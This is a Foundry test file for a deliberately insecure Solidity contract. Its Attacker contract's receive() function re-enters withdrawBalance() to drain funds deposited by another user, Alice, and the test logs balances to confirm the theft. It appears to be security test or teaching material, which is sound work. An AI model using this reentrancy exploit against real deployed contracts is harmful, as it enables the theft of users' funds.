// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import "../src/reentrancy_insecure.sol";

contract ReentrancyTest is Test {
    Reentrancy_insecure public target;
    Attacker public attacker;
    address alice;

    function setUp() public {
        target = new Reentrancy_insecure();
        attacker = new Attacker(target);
        alice = makeAddr("alice");

        // Fund accounts
        vm.deal(address(attacker), 1 ether);
        vm.deal(alice, 1 ether);

        // Make deposits
        attacker.deposit();
        vm.prank(alice);
        target.deposit{value: 1 ether}();
    }

    // Helper function to log key balances
    function logBalances() internal {
        console.log("Contract ETH balance:  ", address(target).balance);
        console.log("Attacker ETH balance:  ", address(attacker).balance);
        console.log("Recorded balance of attacker in contract: ", target.getBalance(address(attacker)));
        console.log("Recorded balance of Alice in contract: ", target.getBalance(alice));
        console.log("----------------------------");
    }

    function testReentrancyVulnerability() public {
        // Pre-attack checks
        assertEq(address(target).balance, 2 ether, "Initial contract balance should be 2 ETH");
        assertEq(target.getBalance(address(attacker)), 1 ether, "Attacker initial balance should be 1 ETH");
        assertEq(target.getBalance(alice), 1 ether, "Alice initial balance should be 1 ETH");

        console.log("--- BEFORE-Trigger Attack ---");
        logBalances();

        // Pre-attack state snapshots
        uint contractBalanceBefore = address(target).balance;
        uint attackerBalanceBefore = address(attacker).balance;
        uint attackerRecordedBalanceBefore = target.getBalance(address(attacker));
        uint aliceRecordedBalanceBefore = target.getBalance(alice);

        console.log("--- Trigger Attack ---");
        attacker.attack();

        console.log("--- AFTER-Trigger Attack ---");
        logBalances();

        // Post-attack state
        uint contractBalanceAfter = address(target).balance;
        uint attackerBalanceAfter = address(attacker).balance;
        uint attackerRecordedBalanceAfter = target.getBalance(address(attacker));
        uint aliceRecordedBalanceAfter = target.getBalance(alice);

        // Check if contract was drained and attacker gained funds
        bool contractDrained = contractBalanceAfter < contractBalanceBefore;
        bool attackerGained = attackerBalanceAfter > attackerBalanceBefore;
        bool vulnerabilityExists = contractDrained && attackerGained;

        // Final vulnerability diagnosis
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: Reentrancy attack successfully drained contract funds");
        } else {
            console.log("Vulnerability not Exist: No significant balance changes occurred during attack");
        }
    }
}

contract Attacker {
    Reentrancy_insecure public immutable target;
    uint256 private count;
    uint256 private constant DEPOSIT_AMOUNT = 1 ether;

    constructor(Reentrancy_insecure _target) {
        target = _target;
    }

    function deposit() public {
        target.deposit{value: DEPOSIT_AMOUNT}();
    }

    function attack() public {
        count = 0;
        target.withdrawBalance();
    }

    receive() external payable {
        count++;
        // Re-enter once to drain additional funds
        if (count == 1) {
            target.withdrawBalance();
        }
    }
}